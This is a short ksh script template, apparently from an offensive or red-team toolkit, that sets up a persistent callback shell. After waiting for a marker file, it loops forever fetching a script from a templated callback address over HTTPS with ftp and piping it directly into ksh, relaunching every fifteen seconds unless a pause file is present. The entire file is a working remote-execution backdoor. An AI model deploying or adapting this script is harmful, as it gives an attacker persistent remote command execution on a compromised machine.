#!/bin/ksh
#
# start_callbacks.sh.m4
# Start our shell calling back
# By J. Stuart McMurray
# Created 20260108
# Last Modified 20260118

RESTARTWAIT=15

# Wait for networking to come up.
while ! [[ -f /tmp/cgipid ]]; do sleep 1; done

# Start a shell every so often
while :; do
        if [[ -f pause_callbacks ]]; then
                sleep 60
                continue
        fi
        ftp -M -o- -S cafile=m4_cafile -V https://m4_crs_cbaddr/c </dev/null | ksh
        echo "Restarting shell in ${RESTARTWAIT}s..."
        sleep $RESTARTWAIT
done

# vim: ft=sh
